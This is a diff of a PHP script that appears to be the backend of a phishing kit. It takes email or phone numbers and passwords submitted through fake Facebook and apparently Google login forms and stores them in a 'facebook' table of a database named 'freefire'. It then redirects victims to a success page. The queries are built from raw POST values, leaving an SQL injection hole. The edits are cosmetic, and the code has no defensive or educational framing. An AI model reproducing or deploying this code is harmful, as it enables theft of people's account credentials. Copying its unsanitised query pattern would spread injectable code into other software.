@@ -1,27 +1,21 @@
 <?php
-
 $conn = mysqli_connect("localhost", "", "redhat", "freefire");
 if($conn === false){
     echo "died connection";
     die("ERROR: Could not connect. "
         . mysqli_connect_error());
 }
-
-//Just a comment
-
+    
 if(isset($_POST['login-fb'])){
     
     $email_num = $_POST['email-num'];
     $fpassword = $_POST['fpassword'];
     $sql1 = "INSERT INTO `facebook`(`email_num`, `password`) VALUES ('$email_num','$fpassword')";
-
+    
     if($connection = mysqli_query($conn,$sql1)){
-
-    }
-
-
-    header("Location:success.html");
         
+    }
+    header("Location:success.html");   
 }
 
 if(isset($_POST['login-go'])){
@@ -33,12 +27,6 @@ if(isset($_POST['login-go'])){
     if($connection = mysqli_query($conn,$sql2)){
 
     }
-
-
-
     header("Location:success.html");
 }
-
-
-
 ?>
